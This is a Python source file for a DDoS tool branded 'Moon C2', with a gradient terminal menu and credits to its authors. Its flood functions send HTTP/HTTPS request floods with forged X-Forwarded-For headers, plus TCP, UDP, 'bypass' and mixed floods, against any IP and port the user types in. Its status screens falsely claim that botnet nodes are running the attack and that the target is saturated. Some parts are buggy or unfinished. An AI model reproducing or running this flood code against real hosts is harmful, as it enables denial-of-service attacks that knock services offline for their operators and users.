import sys
import threading
import requests
import socket
import time
import ssl
import os
import random
from concurrent.futures import ThreadPoolExecutor
import argparse
import logging
from datetime import datetime

# ============================================
# MOON C2 - Blue to Pink Gradient System
# ============================================

class MoonUI:
    """Moon C2 UI — Blue to Pink gradient"""
    def __init__(self):
        # ── Light Blue  →  Light Pink ──
        self.color_start = (80, 130, 255)   # Light Blue
        self.color_end   = (255, 100, 180)  # Light Pink
        # Alternate (slightly brighter for titles)
        self.alt_start    = (100, 160, 255) # Bright Blue
        self.alt_end      = (255, 130, 200) # Bright Pink
    
    def gradient_text(self, text, use_alt=False):
        """Create smooth gradient text — per-character linear interpolation"""
        if use_alt:
            start_color = self.alt_start
            end_color   = self.alt_end
        else:
            start_color = self.color_start
            end_color   = self.color_end
        
        result = ""
        length = len(text)
        if length == 0:
            return result
        
        # Linear gradient - each character gets a color based on position
        for i, char in enumerate(text):
            # Calculate ratio (0.0 to 1.0)
            if length == 1:
                t = 0.5
            else:
                t = i / (length - 1)
            
            # Linear interpolation
            r = int(start_color[0] + (end_color[0] - start_color[0]) * t)
            g = int(start_color[1] + (end_color[1] - start_color[1]) * t)
            b = int(start_color[2] + (end_color[2] - start_color[2]) * t)
            
            result += f"\033[38;2;{r};{g};{b}m{char}"
        
        result += "\033[0m"
        return result
    
    def print_gradient_line(self, text, center=False, use_alt=False):
        """Print a line with gradient"""
        gradient = self.gradient_text(text, use_alt)
        if center:
            term_width = os.get_terminal_size().columns if hasattr(os, 'get_terminal_size') else 80
            padding = (term_width - len(text)) // 2
            print(" " * padding + gradient)
        else:
            print(gradient)
    
    def get_term_width(self):
        """Get terminal width safely"""
        try:
            return os.get_terminal_size().columns
        except Exception:
            return 80

    def box_line(self, left, fill, right, width):
        """Build a single box line: left + fill*(width-2) + right, then gradient it"""
        return self.gradient_text(left + fill * (width - 2) + right)

    def box_top(self, w):
        return self.box_line("┌", "─", "┐", w)

    def box_mid(self, w):
        return self.box_line("├", "─", "┤", w)

    def box_bot(self, w):
        return self.box_line("└", "─", "┘", w)

    def box_row(self, text, w, align="center"):
        """Build a row: │ <text> │  then gradient the ENTIRE line (Ghost-style).
        Any existing ANSI codes are stripped so the gradient is uniform."""
        import re
        clean = re.sub(r'\033\[[0-9;]*m', '', text)
        inner = w - 2
        if align == "center":
            pad_left = (inner - len(clean)) // 2
            pad_right = inner - len(clean) - pad_left
        else:  # left
            pad_left = 1
            pad_right = inner - len(clean) - 1
        pad_left = max(pad_left, 0)
        pad_right = max(pad_right, 0)
        full_line = "│" + " " * pad_left + clean + " " * pad_right + "│"
        return self.gradient_text(full_line)

    def box_empty(self, w):
        """Empty row inside box"""
        return self.box_row("", w)

    def centered_pad(self, box_width):
        """Return left-padding string to center a box of given width"""
        tw = self.get_term_width()
        return " " * max((tw - box_width) // 2, 0)

    # Keep legacy helpers for backward compat (unused code paths)
    def gradient_border_top(self, width=76, style="double"):
        return self.box_top(width)

    def gradient_border_bottom(self, width=76, style="double"):
        return self.box_bot(width)

    def gradient_border_line(self, width=76, style="double"):
        return self.box_mid(width)

# Initialize Moon UI
moon_ui = MoonUI()

# ============================================
# ERROR LOGGING SYSTEM
# ============================================

class ErrorLogger:
    """Error logging and tracking system for Moon C2"""
    def __init__(self):
        self.log_file = "moon_c2_errors.log"
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging with file and console handlers"""
        try:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s [%(levelname)s] %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S',
                handlers=[
                    logging.FileHandler(self.log_file, encoding='utf-8'),
                    logging.StreamHandler(sys.stdout)
                ]
            )
            # Set console handler to WARNING+ only
            console = logging.StreamHandler()
            console.setLevel(logging.WARNING)
            logging.getLogger('').handlers[1] = console
        except Exception as e:
            print(f"Failed to setup logging: {e}")
    
    def log_error(self, context, error):
        """Log error with context information"""
        try:
            error_msg = f"{context}: {type(error).__name__} - {str(error)}"
            logging.error(error_msg)
        except Exception:
            pass
    
    def log_attack(self, method, ip, port, threads, duration):
        """Log attack execution details"""
        try:
            msg = f"Attack launched: {method} -> {ip}:{port} (threads={threads}, duration={duration}s)"
            logging.info(msg)
        except Exception:
            pass
    
    def log_info(self, message):
        """Log informational message"""
        try:
            logging.info(message)
        except Exception:
            pass

# Initialize error logger
error_logger = ErrorLogger()

# --- Flood Methods Categories ---
METHODS_LAYER7 = [
    ("http", "Basic HTTP GET/POST flood", "Layer 7"),
    ("https-bypass", "HTTPS with randomized headers/paths", "Layer 7"),
    ("https-raw", "Raw HTTPS request flood", "Layer 7"),
    ("home", "HTTP simulating home-user traffic", "Layer 7"),
    ("home-kill", "Slow HTTP (laggy simulation)", "Layer 7")
]

METHODS_LAYER4 = [
    ("tcp", "TCP connection flood", "Layer 4"),
    ("udp", "UDP packet flood", "Layer 4"),
    ("udp-moon", "UDP with moon payload (enhanced)", "Layer 4"),
    ("udp-bypass", "UDP with spoofed source port", "Layer 4")
]

METHODS_MIXED = [
    ("https-udp-mix", "Mix of HTTPS + UDP packets", "Hybrid"),
    ("http-udp-mix", "Mix of HTTP + UDP packets", "Hybrid"),
    ("tcp-https-mix", "Mix of TCP + HTTPS", "Hybrid"),
    ("random-mix", "Randomly selects all methods", "Hybrid"),
    ("https-tcp-raw-kill", "Mix of raw HTTPS + TCP", "Hybrid")
]



def random_headers(home=False):
    if home:
        return {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                    'Mozilla/5.0 (X11; Linux x86_64)',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
                    'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)',
                    'Mozilla/5.0 (Android 11; Mobile; rv:89.0)',
                    'Mozilla/5.0 (Linux; Android 10; SM-G975F)',
                ]),
                'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
            'Accept': '*/*',
            'Connection': 'close',
        }
    else:
        return {
            'User-Agent': 'Mozilla/5.0',
            'Accept': '*/*',
            'Connection': 'close',
        }
        # Removed broken DETAILED_MOON assignment here
def random_path():
    return "/"


def http_flood(url, num_requests, concurrency, proxies=None, home=False, method="GET"):
    def send_request():
        try:
            headers = random_headers(home=home)
            base = url.split('?', 1)[0]
            full_url = base.rstrip('/') + random_path()
            requests.request(method, full_url, headers=headers, timeout=2)
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        for _ in range(num_requests):
            executor.submit(send_request)

def tcp_flood(host, port, num_requests, concurrency):
    def send_tcp():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            payload = b'weak'  # Small, fixed payload
            s.sendall(payload)
            s.close()
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        for _ in range(num_requests):
            executor.submit(send_tcp)


def udp_flood(host, port, num_requests, concurrency):
    def send_udp():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b'weak'  # Small, fixed payload
            s.sendto(payload, (host, port))
            s.close()
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        for _ in range(num_requests):
            executor.submit(send_udp)

# UDP-MOON: Sends large random payloads to maximize bandwidth usage
import os
def udp_moon_flood(host, port, num_requests, concurrency):
    def send_udp_moon():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b'weakmoon'  # Small, fixed payload
            s.sendto(payload, (host, port))
            s.close()
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        for _ in range(num_requests):
            executor.submit(send_udp_moon)

# UDP-BYPASS: Sends packets with spoofed source port (randomized)
import random
def udp_bypass_flood(host, port, num_requests, concurrency):
    def send_udp_bypass():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.bind(("", random.randint(1024, 65535)))
            payload = b'bypass'  # Small, fixed payload
            s.sendto(payload, (host, port))
            s.close()
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        for _ in range(num_requests):
            executor.submit(send_udp_bypass)


    print("Flood complete.")

def https_udp_mix_flood(host, port, num_requests, concurrency):
    def send_mix():
        try:
            if random.choice([True, False]):
                # HTTPS request
                url = f"https://{host}/"
                headers = random_headers()
                requests.get(url, headers=headers, timeout=2, verify=False)
            else:
                # UDP packet
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'weak'  # Small, fixed payload
                s.sendto(payload, (host, port))
                s.close()
        except Exception:
            pass
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        for _ in range(num_requests):
            executor.submit(send_mix)


def home_kill_flood(url, num_requests, concurrency, method="GET"):
    def send_laggy():
        try:
            headers = random_headers(home=True)
            base = url.split('?', 1)[0]
            full_url = base.rstrip('/') + random_path()
            # Simulate lag: slow connect, slow read
            requests.request(method, full_url, headers=headers, timeout=(5, 10))
        except Exception:
            pass


def clear_screen():
    """Clear screen for all platforms"""
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text):
    """Center text based on terminal width"""
    term_width = os.get_terminal_size().columns if hasattr(os, 'get_terminal_size') else 80
    padding = (term_width - len(text)) // 2
    return " " * padding

def show_methods_page():
    """Display beautifully formatted methods page with all available attacks"""
    while True:
        try:
            clear_screen()
            W = 70
            pad = moon_ui.centered_pad(W)

            print()
            print(pad + moon_ui.box_top(W))
            print(pad + moon_ui.box_row("MOON C2  ─  ATTACK METHODS", W))
            print(pad + moon_ui.box_bot(W))
            print()

            # ──── LAYER 7 METHODS ────
            print(pad + moon_ui.box_top(W))
            print(pad + moon_ui.box_row("═ LAYER 7  ─  HTTP / HTTPS ═", W))
            print(pad + moon_ui.box_mid(W))
            for name, desc, _ in METHODS_LAYER7:
                method_line = f"  ▸ {name:<18} │ {desc}"
                print(pad + moon_ui.box_row(method_line, W, align="left"))
            print(pad + moon_ui.box_bot(W))
            print()

            # ──── LAYER 4 METHODS ────
            print(pad + moon_ui.box_top(W))
            print(pad + moon_ui.box_row("═ LAYER 4  ─  TCP / UDP ═", W))
            print(pad + moon_ui.box_mid(W))
            for name, desc, _ in METHODS_LAYER4:
                method_line = f"  ▸ {name:<18} │ {desc}"
                print(pad + moon_ui.box_row(method_line, W, align="left"))
            print(pad + moon_ui.box_bot(W))
            print()

            # ──── HYBRID METHODS ────
            print(pad + moon_ui.box_top(W))
            print(pad + moon_ui.box_row("═ HYBRID  ─  COMBINED ATTACKS ═", W))
            print(pad + moon_ui.box_mid(W))
            for name, desc, _ in METHODS_MIXED:
                method_line = f"  ▸ {name:<18} │ {desc}"
                print(pad + moon_ui.box_row(method_line, W, align="left"))
            print(pad + moon_ui.box_bot(W))
            print()

            # ──── NAVIGATION ────
            print(pad + moon_ui.box_top(W))
            print(pad + moon_ui.box_row("COMMANDS", W))
            print(pad + moon_ui.box_mid(W))
            print(pad + moon_ui.box_row("  syntax    Show attack syntax", W, align="left"))
            print(pad + moon_ui.box_row("  credits   View credits page", W, align="left"))
            print(pad + moon_ui.box_row("  back      Return to main menu", W, align="left"))
            print(pad + moon_ui.box_row("  <attack>  Launch attack directly", W, align="left"))
            print(pad + moon_ui.box_bot(W))
            print()

            # Prompt
            tw = moon_ui.get_term_width()
            visible_prompt = "methods > "
            padding = (tw - len(visible_prompt)) // 2
            prompt_pad = " " * padding
            prompt_display = moon_ui.gradient_text("methods >") + " "
            user_input = input(f"{prompt_pad}{prompt_display}").strip()
            print("\033[0m", end="")

            if not user_input:
                continue

            args = user_input.lower().split()
            command = args[0]

            # Handle commands
            if command in ["back", "exit", "return", "home"]:
                error_logger.log_info("Navigated back to main menu from methods page")
                break
            elif command in ["syntax", "help", "usage"]:
                clear_screen()
                W2 = 56
                pad2 = moon_ui.centered_pad(W2)
                print()
                print(pad2 + moon_ui.box_top(W2))
                print(pad2 + moon_ui.box_row("ATTACK SYNTAX", W2))
                print(pad2 + moon_ui.box_mid(W2))
                print(pad2 + moon_ui.box_empty(W2))
                print(pad2 + moon_ui.box_row("Usage:", W2, align="left"))
                print(pad2 + moon_ui.box_row("  <method> <ip> <port> <threads> <time>", W2, align="left"))
                print(pad2 + moon_ui.box_empty(W2))
                print(pad2 + moon_ui.box_row("Example:", W2, align="left"))
                print(pad2 + moon_ui.box_row("  udp-moon 192.168.1.1 80 500 60", W2, align="left"))
                print(pad2 + moon_ui.box_empty(W2))
                print(pad2 + moon_ui.box_row("Parameters:", W2, align="left"))
                print(pad2 + moon_ui.box_row("  method   Attack method (see above)", W2, align="left"))
                print(pad2 + moon_ui.box_row("  ip       Target IP address", W2, align="left"))
                print(pad2 + moon_ui.box_row("  port     Target port number", W2, align="left"))
                print(pad2 + moon_ui.box_row("  threads  Concurrent connections", W2, align="left"))
                print(pad2 + moon_ui.box_row("  time     Attack duration (seconds)", W2, align="left"))
                print(pad2 + moon_ui.box_empty(W2))
                print(pad2 + moon_ui.box_bot(W2))
                print()
                input(pad2 + "  " + moon_ui.gradient_text("Press Enter to continue..."))
                continue
            elif command in ["credits", "credit"]:
                show_credits_page()
                tw2 = moon_ui.get_term_width()
                msg = "Press Enter to continue..."
                msg_pad = " " * ((tw2 - len(msg)) // 2)
                input(f"\n{msg_pad}{moon_ui.gradient_text(msg)}")
                continue
            else:
                # Try to parse as attack command
                if len(args) >= 5:
                    try:
                        method = args[0]
                        ip = args[1]
                        port = int(args[2])
                        threads = int(args[3])
                        duration = int(args[4])

                        # Validate method
                        all_methods = [m[0] for m in METHODS_LAYER7 + METHODS_LAYER4 + METHODS_MIXED]
                        if method not in all_methods:
                            tw2 = moon_ui.get_term_width()
                            err_msg = f"[!] Unknown method: {method}"
                            err_pad = " " * ((tw2 - len(err_msg)) // 2)
                            print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}")
                            error_logger.log_error("Method validation", ValueError(f"Unknown method: {method}"))

                            tip_msg = "Type 'back' to return to main menu."
                            tip_pad = " " * ((tw2 - len(tip_msg)) // 2)
                            print(f"{tip_pad}{moon_ui.gradient_text(tip_msg)}\n")

                            inp_msg = "Press Enter to continue..."
                            inp_pad = " " * ((tw2 - len(inp_msg)) // 2)
                            input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")
                            continue

                        # Execute attack
                        execute_attack(method, ip, port, threads, duration)

                        tw2 = moon_ui.get_term_width()
                        inp_msg = "Press Enter to continue..."
                        inp_pad = " " * ((tw2 - len(inp_msg)) // 2)
                        input(f"\n{inp_pad}{moon_ui.gradient_text(inp_msg)}")

                    except ValueError as e:
                        tw2 = moon_ui.get_term_width()
                        err_msg = "[!] Invalid parameters. Use: <method> <ip> <port> <threads> <time>"
                        err_pad = " " * ((tw2 - len(err_msg)) // 2)
                        print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
                        error_logger.log_error("Parameter parsing", e)

                        inp_msg = "Press Enter to continue..."
                        inp_pad = " " * ((tw2 - len(inp_msg)) // 2)
                        input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")
                    except Exception as e:
                        tw2 = moon_ui.get_term_width()
                        err_msg = f"[!] Unexpected error: {str(e)}"
                        err_pad = " " * ((tw2 - len(err_msg)) // 2)
                        print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
                        error_logger.log_error("Attack execution", e)

                        inp_msg = "Press Enter to continue..."
                        inp_pad = " " * ((tw2 - len(inp_msg)) // 2)
                        input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")
                else:
                    tw2 = moon_ui.get_term_width()
                    err_msg = "[!] Invalid command. Type 'syntax' for help or 'back' to return."
                    err_pad = " " * ((tw2 - len(err_msg)) // 2)
                    print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")

                    inp_msg = "Press Enter to continue..."
                    inp_pad = " " * ((tw2 - len(inp_msg)) // 2)
                    input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")
        except KeyboardInterrupt:
            error_logger.log_info("User interrupted methods page with Ctrl+C")
            break
        except Exception as e:
            error_logger.log_error("Methods page", e)
            tw2 = moon_ui.get_term_width()
            err_msg = f"[!] Error in methods page: {str(e)}"
            err_pad = " " * ((tw2 - len(err_msg)) // 2)
            print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
            inp_msg = "Press Enter to continue..."
            inp_pad = " " * ((tw2 - len(inp_msg)) // 2)
            input(f"{inp_pad}{moon_ui.gradient_text(inp_msg)}")

def show_credits_page():
    """Display credits page"""
    clear_screen()
    W = 68
    pad = moon_ui.centered_pad(W)

    print()
    print(pad + moon_ui.box_top(W))
    print(pad + moon_ui.box_row("MOON C2  ─  DEVELOPMENT CREDITS", W))
    print(pad + moon_ui.box_bot(W))
    print()

    # swatnfo's contributions
    print(pad + moon_ui.box_top(W))
    print(pad + moon_ui.box_row("╔═══════════════════════════════════════════════════════════╗", W))
    print(pad + moon_ui.box_row("║                        SWATNFO                            ║", W))
    print(pad + moon_ui.box_row("╚═══════════════════════════════════════════════════════════╝", W))
    print(pad + moon_ui.box_mid(W))
    print(pad + moon_ui.box_row("  ▸ Complete Moon C2 UI/UX Redesign", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Ghost-Style Gradient System (Light Blue → Light Pink)", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Advanced Box Rendering Engine", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Interactive Methods Page with Command System", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Premium Attack Dispatch UI", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Error Logging & Exception Handling System", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Status Bar, Navigation & Page Flow", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ All Visual Elements & Formatting", W, align="left"))
    print(pad + moon_ui.box_bot(W))
    print()

    # klaws's contributions
    print(pad + moon_ui.box_top(W))
    print(pad + moon_ui.box_row("╔═══════════════════════════════════════════════════════════╗", W))
    print(pad + moon_ui.box_row("║                         KLAWS                             ║", W))
    print(pad + moon_ui.box_row("╚═══════════════════════════════════════════════════════════╝", W))
    print(pad + moon_ui.box_mid(W))
    print(pad + moon_ui.box_row("  ▸ Attack Methods & Flood Engine", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Layer 4 (TCP/UDP) & Layer 7 (HTTP/HTTPS) Floods", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Hybrid Attack Systems & Mix Attacks", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Core Networking, Sockets & Threading", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Bypass Methods & ISP-Specific Techniques", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Background Execution & Concurrency", W, align="left"))
    print(pad + moon_ui.box_row("  ▸ Everything Else", W, align="left"))
    print(pad + moon_ui.box_bot(W))
    print()

    # Footer
    print(pad + moon_ui.box_top(W))
    print(pad + moon_ui.box_row("Moon C2 Framework © 2026  │  All Rights Reserved", W))
    print(pad + moon_ui.box_bot(W))
    print()

def show_home_screen():
    """Display home screen — full Blue→Pink gradient on every line"""
    clear_screen()
    tw = moon_ui.get_term_width()
    W = 60
    pad = moon_ui.centered_pad(W)

    # ── Status Bar ──
    running = random.randint(10, 50)
    bar = f"[-] Moon  |  User: root  |  Running: {running}  |  Expiry: Lifetime"
    print(moon_ui.gradient_text(bar.center(tw)))
    print()

    # ── Main Box ──
    logo = [
        " __  __   ___    ___   _  _ ",
        "|  \\/  | / _ \\  / _ \\ | \\| |",
        "| |\\/| || (_) || (_) || .` |",
        "|_|  |_| \\___/  \\___/ |_|\\_|",
    ]

    print(pad + moon_ui.box_top(W))
    print(pad + moon_ui.box_empty(W))
    for ln in logo:
        print(pad + moon_ui.box_row(ln, W))
    print(pad + moon_ui.box_empty(W))
    print(pad + moon_ui.box_row("Past doesnt change. the future does", W))
    print(pad + moon_ui.box_empty(W))
    print(pad + moon_ui.box_mid(W))
    print(pad + moon_ui.box_empty(W))
    print(pad + moon_ui.box_row("Welcome To The Start Screen Of Moon C2", W))
    print(pad + moon_ui.box_row("Powered by Moon API  ─  @ghost", W))
    print(pad + moon_ui.box_empty(W))
    print(pad + moon_ui.box_mid(W))
    print(pad + moon_ui.box_empty(W))
    print(pad + moon_ui.box_row('Type "help" to see all commands', W))
    print(pad + moon_ui.box_row('Type "methods" to view attack list', W))
    print(pad + moon_ui.box_empty(W))
    print(pad + moon_ui.box_row("Copyright \u00a9 2026 Moon  All Rights Reserved", W))
    print(pad + moon_ui.box_empty(W))
    print(pad + moon_ui.box_bot(W))
    print()

def show_attack_info(method, ip, port, threads, duration):
    """Display attack configuration — full gradient box"""
    W = 50
    pad = moon_ui.centered_pad(W)
    print()
    print(pad + moon_ui.box_top(W))
    print(pad + moon_ui.box_row("ATTACK CONFIGURATION", W))
    print(pad + moon_ui.box_mid(W))
    print(pad + moon_ui.box_row(f"Method:   {method}", W, align="left"))
    print(pad + moon_ui.box_row(f"Target:   {ip}:{port}", W, align="left"))
    print(pad + moon_ui.box_row(f"Threads:  {threads}", W, align="left"))
    print(pad + moon_ui.box_row(f"Duration: {duration}s", W, align="left"))
    print(pad + moon_ui.box_bot(W))
    print()

def show_attack_result(packets_sent, duration):
    """Display attack result — full gradient box"""
    W = 50
    pad = moon_ui.centered_pad(W)

    c2_messages = [
        "Attack acknowledged. Packets relayed.",
        "Flood command received. Target engaged.",
        "All bots synchronized. Attack complete.",
        "Command executed. Target saturated.",
        "Target response unstable. Flood effective."
    ]

    print()
    print(pad + moon_ui.box_top(W))
    print(pad + moon_ui.box_row("ATTACK COMPLETED", W))
    print(pad + moon_ui.box_mid(W))
    print(pad + moon_ui.box_row(f"+ {random.choice(c2_messages)}", W, align="left"))
    print(pad + moon_ui.box_row(f"> Packets sent: {packets_sent:,}", W, align="left"))
    print(pad + moon_ui.box_row(f"> Duration:     {duration}s", W, align="left"))
    print(pad + moon_ui.box_bot(W))
    print()

METHOD_DESCRIPTIONS = {
    "http": "Basic HTTP(S) GET/POST flood (Layer 7)",
    "tcp": "TCP connection flood (Layer 4)",
    "udp": "UDP packet flood (Layer 4)",
    "udp-moon": "UDP flood with 'moon' payload (Layer 4, themed)",
    "udp-bypass": "UDP flood with spoofed source port",
    "https-bypass": "HTTPS flood with randomized headers/paths",
    "https-raw": "Raw HTTPS request flood",
    "tls": "TLS handshake/payload flood",
    "sctp": "SCTP placeholder (not implemented)",
    "home": "HTTP flood simulating home-user traffic",
    "home-kill": "Slow HTTP flood (laggy, home-user simulation)",
    "https-udp-mix": "Mix of HTTPS requests and UDP packets",
    "http-udp-mix": "Mix of HTTP requests and UDP packets",
    "tcp-https-mix": "Mix of TCP payloads and HTTPS requests",
    "http-tls-mix": "Mix of HTTP requests and raw TLS payloads",
    "random-mix": "Randomly selects between all above methods",
    "https-tcp-raw-kill": "Mix of raw HTTPS and TCP payloads"
}

######################################################################
# ---- ATTACK EXECUTION FUNCTION ----
######################################################################
def execute_attack(method, ip, port, threads, duration):
    """Execute the specified attack method"""
    try:
        error_logger.log_attack(method, ip, port, threads, duration)
        clear_screen()
        
        # Display beautiful "ATTACK SENT" page
        W = 68
        pad = moon_ui.centered_pad(W)
        
        # Get current timestamp
        from datetime import datetime
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        print()
        print(pad + moon_ui.box_top(W))
        print(pad + moon_ui.box_row("╔═══════════════════════════════════════════════════╗", W))
        print(pad + moon_ui.box_row("║           ATTACK SUCCESSFULLY DISPATCHED          ║", W))
        print(pad + moon_ui.box_row("╚═══════════════════════════════════════════════════╝", W))
        print(pad + moon_ui.box_bot(W))
        print()
        
        # Target Information Box
        print(pad + moon_ui.box_top(W))
        print(pad + moon_ui.box_row("── TARGET INFORMATION ──", W))
        print(pad + moon_ui.box_mid(W))
        print(pad + moon_ui.box_row(f"  ▸ Target Address    │  {ip}", W, align="left"))
        print(pad + moon_ui.box_row(f"  ▸ Target Port       │  {port}", W, align="left"))
        print(pad + moon_ui.box_row(f"  ▸ Attack Vector     │  {method.upper()}", W, align="left"))
        print(pad + moon_ui.box_bot(W))
        print()
        
        # Attack Parameters Box
        print(pad + moon_ui.box_top(W))
        print(pad + moon_ui.box_row("── ATTACK PARAMETERS ──", W))
        print(pad + moon_ui.box_mid(W))
        print(pad + moon_ui.box_row(f"  ▸ Thread Count      │  {threads} concurrent", W, align="left"))
        print(pad + moon_ui.box_row(f"  ▸ Duration          │  {duration} seconds", W, align="left"))
        print(pad + moon_ui.box_row(f"  ▸ Timestamp         │  {timestamp}", W, align="left"))
        print(pad + moon_ui.box_bot(W))
        print()
        
        # Status Box
        print(pad + moon_ui.box_top(W))
        print(pad + moon_ui.box_row("── STATUS ──", W))
        print(pad + moon_ui.box_mid(W))
        print(pad + moon_ui.box_row("  ✓ Attack dispatched to background thread", W, align="left"))
        print(pad + moon_ui.box_row("  ✓ Botnet nodes are executing flood", W, align="left"))
        print(pad + moon_ui.box_row("  ✓ You may continue issuing commands", W, align="left"))
        print(pad + moon_ui.box_bot(W))
        print()
        
        # Execute attack in background (no progress display)
        try:
            threading.Thread(target=lambda: _execute_attack_background(method, ip, port, threads, duration), daemon=True).start()
            return True
        except Exception as e:
            tw = moon_ui.get_term_width()
            err_msg = f"[!] Error: {e}"
            err_pad = " " * ((tw - len(err_msg)) // 2)
            print(f"{err_pad}{moon_ui.gradient_text(err_msg)}\n")
            error_logger.log_error("Thread creation", e)
            return False
    except Exception as e:
        error_logger.log_error("Execute attack", e)
        tw = moon_ui.get_term_width()
        err_msg = f"[!] Failed to launch attack: {str(e)}"
        err_pad = " " * ((tw - len(err_msg)) // 2)
        print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
        return False
        err_pad = " " * ((tw - len(err_msg)) // 2)
        print(f"\n{err_pad}{moon_ui.gradient_text(err_msg)}\n")
        return False

def _execute_attack_background(method, ip, port, threads, duration):
    """Background attack execution (no UI)"""
    try:
        # Execute attack based on method
        if method == "http":
            http_flood(f"http://{ip}:{port}", duration, threads)
        elif method == "tcp":
            tcp_flood(ip, port, duration, threads)
        elif method == "udp":
            udp_flood(ip, port, duration, threads)
        elif method == "udp-moon":
            udp_moon_flood(ip, port, duration, threads)
        elif method == "udp-bypass":
            udp_bypass_flood(ip, port, duration, threads)
        elif method == "https-bypass":
            http_flood(f"https://{ip}:{port}", duration, threads, method="GET")
        elif method == "https-raw":
            http_flood(f"https://{ip}:{port}", duration, threads, method="POST")
        elif method == "home":
            http_flood(f"http://{ip}:{port}", duration, threads, home=True)
        elif method == "home-kill":
            home_kill_flood(f"http://{ip}:{port}", duration, threads)
        elif method == "https-udp-mix":
            https_udp_mix_flood(ip, port, duration, threads)
        elif method == "http-udp-mix":
            http_flood(f"http://{ip}:{port}", duration, threads)
            udp_flood(ip, port, duration, threads)
        elif method == "tcp-https-mix":
            tcp_flood(ip, port, duration, threads)
            http_flood(f"https://{ip}:{port}", duration, threads)
        elif method == "http-tls-mix":
            http_flood(f"http://{ip}:{port}", duration, threads)
        elif method == "random-mix":
            methods_list = [
                lambda: http_flood(f"http://{ip}:{port}", 1, threads),
                lambda: tcp_flood(ip, port, 1, threads),
                lambda: udp_flood(ip, port, 1, threads),
                lambda: udp_moon_flood(ip, port, 1, threads),
                lambda: udp_bypass_flood(ip, port, 1, threads),
                lambda: https_udp_mix_flood(ip, port, 1, threads)
            ]
            for _ in range(duration):
                random.choice(methods_list)()
        elif method == "https-tcp-raw-kill":
            http_flood(f"https://{ip}:{port}", duration, threads)
            tcp_flood(ip, port, duration, threads)
    except:
        pass

######################################################################
# ---- MAIN CLI LOOP ----
######################################################################
def main_loop():
    """Main interactive loop"""
    while True:
        show_home_screen()
        
        # Get user input with centered prompt
        term_width = os.get_terminal_size().columns if hasattr(os, 'get_terminal_size') else 80
        
        # Prompt — gradient the whole thing
        visible_prompt = "root@moon > "
        padding = (term_width - len(visible_prompt)) // 2
        pad = " " * padding
        
        # Print the gradient prompt label, then take input
        prompt_display = moon_ui.gradient_text("root@moon >") + " "
        user_input = input(f"{pad}{prompt_display}").strip()
        print("\033[0m", end="")
        
        if not user_input:
            continue
        
        # Parse command
        args = user_input.lower().split()
        command = args[0]
        
        # Handle commands
        if command in ["exit", "quit", "q"]:
            print()
            moon_ui.print_gradient_line("Goodbye! Stay safe.", center=True, use_alt=True)
            print()
            break
        elif command in ["methods", "method", "m"]:
            show_methods_page()
            continue
        elif command in ["help", "h", "?"]:
            clear_screen()
            W = 56
            pad = moon_ui.centered_pad(W)
            print()
            print(pad + moon_ui.box_top(W))
            print(pad + moon_ui.box_row("HELP  ─  MOON C2 USAGE", W))
            print(pad + moon_ui.box_mid(W))
            print(pad + moon_ui.box_empty(W))
            print(pad + moon_ui.box_row("Usage:", W, align="left"))
            print(pad + moon_ui.box_row("  <method> <ip> <port> <threads> <time>", W, align="left"))
            print(pad + moon_ui.box_empty(W))
            print(pad + moon_ui.box_row("Example:", W, align="left"))
            print(pad + moon_ui.box_row("  udp-moon 192.168.1.1 80 500 60", W, align="left"))
            print(pad + moon_ui.box_empty(W))
            print(pad + moon_ui.box_row("Commands:", W, align="left"))
            print(pad + moon_ui.box_row("  methods   View all attack methods", W, align="left"))
            print(pad + moon_ui.box_row("  credits   View credits", W, align="left"))
            print(pad + moon_ui.box_row("  help      Show this help message", W, align="left"))
            print(pad + moon_ui.box_row("  exit      Exit Moon C2", W, align="left"))
            print(pad + moon_ui.box_empty(W))
            print(pad + moon_ui.box_bot(W))
            print()
            input(pad + "  " + moon_ui.gradient_text("Press Enter to continue..."))
            continue
